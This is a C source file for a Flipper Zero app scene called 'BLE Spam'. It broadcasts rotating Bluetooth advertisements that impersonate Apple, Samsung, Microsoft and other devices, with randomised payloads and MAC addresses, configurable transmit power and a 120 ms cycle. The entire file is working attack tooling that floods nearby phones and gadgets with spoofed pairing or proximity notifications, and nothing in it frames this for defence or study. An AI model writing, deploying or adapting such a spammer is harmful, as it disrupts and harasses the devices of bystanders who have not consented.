#include "../zx_ble_spam.h"
#include "scenes.h"
#include <extra_beacon.h>
#include <furi.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define BLE_SPAM_TEMPLATES 10
#define BLE_SPAM_INTERVAL_MS 120

static const char* device_names[] = {
    "iPhone 15", "AirPods Pro", "AirTag", "Samsung S24", "SmartTag2",
    "Tile Pro", "Pixel 9", "iBeacon", "Surface Pro", "LG TV",
};

static uint8_t template_data[BLE_SPAM_TEMPLATES][31];
static uint8_t template_lens[BLE_SPAM_TEMPLATES];
static uint8_t template_random_start[BLE_SPAM_TEMPLATES];

static const uint16_t interval_map[] = {50, 100, 200, 500};
static const uint8_t cycle_map[] = {1, 3, 5, 10};
static const GapAdvPowerLevelInd power_map[] = {
    GapAdvPowerLevel_Neg12_05dBm,
    GapAdvPowerLevel_Neg9_9dBm,
    GapAdvPowerLevel_Neg4dBm,
    GapAdvPowerLevel_0dBm,
    GapAdvPowerLevel_3dBm,
    GapAdvPowerLevel_6dBm,
};

static void random_mac(uint8_t* mac) {
    mac[0] = (rand() & 0xFC) | 0x02;
    for(int i = 1; i < 6; i++) mac[i] = rand() & 0xFF;
}

static void init_templates(void) {
    static bool ready = false;
    if(ready) return;
    for(int t = 0; t < BLE_SPAM_TEMPLATES; t++) {
        uint8_t* d = template_data[t];
        uint8_t i = 0;
        d[i++] = 2; d[i++] = 1; d[i++] = 0x06;
        switch(t) {
        case 0:
            d[i++] = 15; d[i++] = 0xFF; d[i++] = 0x4C; d[i++] = 0x00;
            d[i++] = 0x0A; d[i++] = 0x00;
            for(int j = 0; j < 10; j++) d[i++] = rand() & 0xFF;
            break;
        case 1:
            d[i++] = 12; d[i++] = 0xFF; d[i++] = 0x4C; d[i++] = 0x00;
            d[i++] = 0x07; d[i++] = 0x00;
            for(int j = 0; j < 7; j++) d[i++] = rand() & 0xFF;
            break;
        case 2:
            d[i++] = 20; d[i++] = 0xFF; d[i++] = 0x4C; d[i++] = 0x00;
            d[i++] = 0x12; d[i++] = 0x00;
            for(int j = 0; j < 15; j++) d[i++] = rand() & 0xFF;
            break;
        case 3:
            d[i++] = 19; d[i++] = 0xFF; d[i++] = 0x75; d[i++] = 0x00;
            d[i++] = 0x01; d[i++] = 0x00;
            for(int j = 0; j < 14; j++) d[i++] = rand() & 0xFF;
            break;
        case 4:
            d[i++] = 16; d[i++] = 0xFF; d[i++] = 0x75; d[i++] = 0x00;
            d[i++] = 0x03; d[i++] = 0x00;
            for(int j = 0; j < 11; j++) d[i++] = rand() & 0xFF;
            break;
        case 5:
            d[i++] = 14; d[i++] = 0xFF; d[i++] = 0x4C; d[i++] = 0x00;
            d[i++] = 0x05; d[i++] = 0x00;
            for(int j = 0; j < 9; j++) d[i++] = rand() & 0xFF;
            break;
        case 6:
            d[i++] = 17; d[i++] = 0xFF; d[i++] = 0x4C; d[i++] = 0x00;
            d[i++] = 0x0F; d[i++] = 0x00;
            for(int j = 0; j < 12; j++) d[i++] = rand() & 0xFF;
            break;
        case 7:
            d[i++] = 20; d[i++] = 0xFF; d[i++] = 0x4C; d[i++] = 0x00;
            d[i++] = 0x02; d[i++] = 0x15;
            for(int j = 0; j < 15; j++) d[i++] = rand() & 0xFF;
            break;
        case 8:
            d[i++] = 10; d[i++] = 0xFF; d[i++] = 0x06; d[i++] = 0x00;
            d[i++] = 0x01; d[i++] = 0x00;
            for(int j = 0; j < 5; j++) d[i++] = rand() & 0xFF;
            break;
        case 9:
            d[i++] = 6; d[i++] = 0x09;
            d[i++] = 'L'; d[i++] = 'G'; d[i++] = ' '; d[i++] = 'T'; d[i++] = 'V';
            break;
        }
        template_lens[t] = i;
        template_random_start[t] = 9;
    }
    template_random_start[9] = 7;
    ready = true;
}

static void button_callback(GuiButtonType type, InputType input_type, void* context) {
    UNUSED(type);
    UNUSED(input_type);
    App* app = context;
    view_dispatcher_send_custom_event(app->view_dispatcher, BLEEventToggleScan);
}

static void update_widget(App* app) {
    widget_reset(app->widget);
    char buf[64];

    widget_add_string_element(app->widget, 64, 5, AlignCenter, AlignCenter, FontPrimary,
        app->ble_spam_active ? "BLE Spam [ACTIVE]" : "BLE Spam");

    if(app->ble_spam_active) {
        snprintf(buf, sizeof(buf), "Packets: %lu", app->ble_spam_packets);
        widget_add_string_element(app->widget, 64, 16, AlignCenter, AlignCenter, FontSecondary, buf);

        uint8_t idx = app->ble_spam_type % 10;
        snprintf(buf, sizeof(buf), "Device: %s", device_names[idx]);
        widget_add_string_element(app->widget, 64, 26, AlignCenter, AlignCenter, FontSecondary, buf);

        snprintf(buf, sizeof(buf), "MAC: %02X:%02X:%02X:%02X:%02X:%02X",
            app->ble_spam_mac[0], app->ble_spam_mac[1], app->ble_spam_mac[2],
            app->ble_spam_mac[3], app->ble_spam_mac[4], app->ble_spam_mac[5]);
        widget_add_string_element(app->widget, 64, 36, AlignCenter, AlignCenter, FontKeyboard, buf);

        snprintf(buf, sizeof(buf), "Beacon: %s", furi_hal_bt_extra_beacon_is_active() ? "OK" : "OFF");
        widget_add_string_element(app->widget, 64, 46, AlignCenter, AlignCenter, FontSecondary, buf);

        widget_add_button_element(app->widget, GuiButtonTypeCenter, "Stop", button_callback, app);
    } else {
        uint8_t active = furi_hal_bt_extra_beacon_is_active();
        snprintf(buf, sizeof(buf), "Active: %s  Radio: %s", 
            active ? "Y" : "N",
            furi_hal_bt_is_alive() ? "OK" : "OFF");
        widget_add_string_element(app->widget, 64, 20, AlignCenter, AlignCenter, FontSecondary, buf);
        widget_add_string_element(app->widget, 64, 34, AlignCenter, AlignCenter, FontSecondary,
            "Press OK to start");
        widget_add_string_element(app->widget, 64, 44, AlignCenter, AlignCenter, FontSecondary,
            "Spams BLE devices");
        widget_add_string_element(app->widget, 64, 54, AlignCenter, AlignCenter, FontSecondary,
            "via built-in radio");
        widget_add_button_element(app->widget, GuiButtonTypeCenter, "Start", button_callback, app);
    }
}

static void spam_timer_callback(void* context) {
    App* app = context;
    if(!app || !app->ble_spam_active) return;

    app->scene_count++;
    uint8_t idx = app->scene_count % BLE_SPAM_TEMPLATES;

    bool change_mac = app->settings_mac_random &&
        (app->scene_count % cycle_map[app->settings_cycle_rate] == 0);

    if(change_mac) {
        uint8_t new_mac[6];
        random_mac(new_mac);
        memcpy(app->ble_spam_mac, new_mac, 6);

        uint16_t interval = interval_map[app->settings_adv_interval];
        GapExtraBeaconConfig config = {
            .min_adv_interval_ms = interval,
            .max_adv_interval_ms = interval + 100,
            .adv_channel_map = GapAdvChannelMapAll,
            .adv_power_level = power_map[app->settings_tx_power],
            .address_type = GapAddressTypeRandom,
        };
        memcpy(config.address, new_mac, 6);

        uint8_t rs = template_random_start[idx];
        for(uint8_t j = rs; j < template_lens[idx]; j++) template_data[idx][j] = rand() & 0xFF;
        furi_hal_bt_extra_beacon_stop();
        if(!furi_hal_bt_extra_beacon_set_config(&config) ||
           !furi_hal_bt_extra_beacon_set_data(template_data[idx], template_lens[idx]) ||
           !furi_hal_bt_extra_beacon_start())
        {
            app_add_log(app, "BLE beacon error");
            app->ble_spam_active = false;
            update_widget(app);
            return;
        }
    } else {
        uint8_t* d = template_data[idx];
        uint8_t rs = template_random_start[idx];
        for(uint8_t j = rs; j < template_lens[idx]; j++) d[j] = rand() & 0xFF;
        if(!furi_hal_bt_extra_beacon_set_data(template_data[idx], template_lens[idx])) {
            app_add_log(app, "BLE data error");
        }
    }

    app->ble_spam_type = idx;
    app->ble_spam_packets++;
    update_widget(app);
}

void zx_ble_spam_scene_ble_spam_on_enter(void* context) {
    App* app = context;
    init_templates();
    app->ble_spam_active = false;
    app->ble_spam_packets = 0;
    app->ble_spam_type = 0;
    random_mac(app->ble_spam_mac);
    update_widget(app);
    view_dispatcher_switch_to_view(app->view_dispatcher, AppViewWidget);
}

bool zx_ble_spam_scene_ble_spam_on_event(void* context, SceneManagerEvent event) {
    App* app = context;

    if(event.type == SceneManagerEventTypeCustom) {
        if(event.event == BLEEventToggleScan) {
            if(app->ble_spam_active) {
                app->ble_spam_active = false;
                if(app->scene_timer) {
                    furi_timer_stop(app->scene_timer);
                    furi_timer_free(app->scene_timer);
                    app->scene_timer = NULL;
                }
                furi_hal_bt_extra_beacon_stop();
            } else {
                app->scene_count = 0;
                app->ble_spam_active = true;
                app->ble_spam_packets = 0;
                random_mac(app->ble_spam_mac);

                uint16_t interval = interval_map[app->settings_adv_interval];
                GapExtraBeaconConfig config = {
                    .min_adv_interval_ms = interval,
                    .max_adv_interval_ms = interval + 100,
                    .adv_channel_map = GapAdvChannelMapAll,
                    .adv_power_level = power_map[app->settings_tx_power],
                    .address_type = GapAddressTypeRandom,
                };
                memcpy(config.address, app->ble_spam_mac, 6);

                furi_hal_bt_extra_beacon_stop();
                if(!furi_hal_bt_extra_beacon_set_config(&config) ||
                   !furi_hal_bt_extra_beacon_set_data(template_data[0], template_lens[0]) ||
                   !furi_hal_bt_extra_beacon_start())
                {
                    app_add_log(app, "BLE start failed");
                    app->ble_spam_active = false;
                    update_widget(app);
                    return true;
                }

                app->scene_timer = furi_timer_alloc(spam_timer_callback, FuriTimerTypePeriodic, app);
                furi_timer_start(app->scene_timer, BLE_SPAM_INTERVAL_MS);
            }
            update_widget(app);
            return true;
        }
    }

    return false;
}

void zx_ble_spam_scene_ble_spam_on_exit(void* context) {
    App* app = context;
    app->ble_spam_active = false;
    if(app->scene_timer) {
        furi_timer_stop(app->scene_timer);
        furi_timer_free(app->scene_timer);
        app->scene_timer = NULL;
    }
    furi_hal_bt_extra_beacon_stop();
    widget_reset(app->widget);
}
